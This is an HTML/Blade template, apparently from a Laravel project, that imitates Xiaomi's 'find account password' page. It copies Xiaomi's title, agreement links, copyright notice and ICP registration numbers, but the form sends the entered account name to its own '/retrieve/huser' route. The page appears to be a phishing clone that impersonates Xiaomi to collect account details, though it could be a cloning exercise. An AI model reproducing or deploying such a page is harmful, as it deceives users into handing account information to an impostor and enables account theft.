<!DOCTYPE html>
<html>
    
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
        <title>
            小米帐号 - 找回密码
        </title>
        <link type="text/css" rel="stylesheet" href="{{URL::asset('css/reset.css')}}">
        <link type="text/css" rel="stylesheet" href="{{URL::asset('css/layout.css')}}">
        <link type="text/css" rel="stylesheet" href="{{URL::asset('css/registerpwd.css')}}">
        <style>
            .facebook_area{ display:none!important; }
        </style>
    </head>
    
    <body class="zh_CN">
        <div class="wrapper">
            <div class="wrap">
                <div class="layout">
                    <div class="n-frame device-frame reg_frame" id="main_container">
                        <div class="external_logo_area">
                            <a class="milogo" href="javascript:void(0)">
                            </a>
                        </div>
                        <div class="title-item t_c">
                            <h4 class="title_big30">
                                找回小米帐号
                            </h4>
                        </div>
                        <div>
                            <div class="regbox">
							<form action="/retrieve/huser" method="post" enctype="multipart/form-data">
								{!!csrf_field()!!}
                                <div class="phone_step1">

                                    <div class="inputbg">
                                        <label class="labelbox" for="">
                                            <input name="email"  placeholder="请输入小米账号" type="tel">
                                        </label>
                                    </div>
                                    <div class="err_tip">
                                        <div class="dis_box">
                                            <em class="icon_error">
                                            </em>
                                            <span>
                                            </span>
                                        </div>
                                    </div>
                                    <div class="err_tip">
                                        <div class="dis_box">
                                            <em class="icon_error">
                                            </em>
                                            <span>
                                            </span>
                                        </div>
                                    </div>
                                    <div class="err_tip send-left-times">
                                    </div>
                                    <div class="fixed_bot mar_phone_dis1">
                                        <input class="btn332 btn_reg_1 submit-step"  value="点击下一步"
                                        type="submit">
                                        <img style="display:none;" src="{{URL::asset('Images/tick.png')}}">
                                        <p class="msg">
                                            点击“下一步”，即表示您同意并愿意遵守小米
                                            <a href="http://www.miui.com/res/doc/eula/cn.html" target="_blank" title="用户协议">
                                                用户协议
                                            </a>
                                            和
                                            <a href="http://www.miui.com/res/doc/privacy/cn.html" target="_blank"
                                            title="隐私政策">
                                                隐私政策
                                            </a>
                                        </p>
                                    </div>
                                </div>
							</form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="n-footer">
            <div class="nf-link-area clearfix">
                <ul class="lang-select-list">
                    <li>
                        <a class="lang-select-li current" href="javascript:void(0)" data-lang="zh_CN">
                            简体
                        </a>
                        |
                    </li>
                    <li>
                        <a class="lang-select-li" href="javascript:void(0)" data-lang="zh_TW">
                            繁体
                        </a>
                        |
                    </li>
                    <li>
                        <a class="lang-select-li" href="javascript:void(0)" data-lang="en">
                            English
                        </a>
                    </li>
                    |
                    <li>
                        <a class="a_critical" href="http://static.account.xiaomi.com/html/faq/faqList.html"
                        target="_blank">
                            <em>
                            </em>
                            常见问题
                        </a>
                    </li>
                </ul>
            </div>
            <p class="nf-intro">
                <span>
                    小米公司版权所有-京ICP备10046444-
                    <a class="beianlink beian-record-link" target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=11010802020134">
                        <span>
                            <img src="{{URL::asset('Images/ghs.png')}}">
                        </span>
                        京公网安备11010802020134号
                    </a>
                    -京ICP证110507号
                </span>
            </p>
        </div>
        <script src="{{URL::asset('Scripts/jquery-1.js')}}">
        </script>
        <script src="{{URL::asset('Scripts/placeholder.js')}}">
        </script>
    </body>

</html>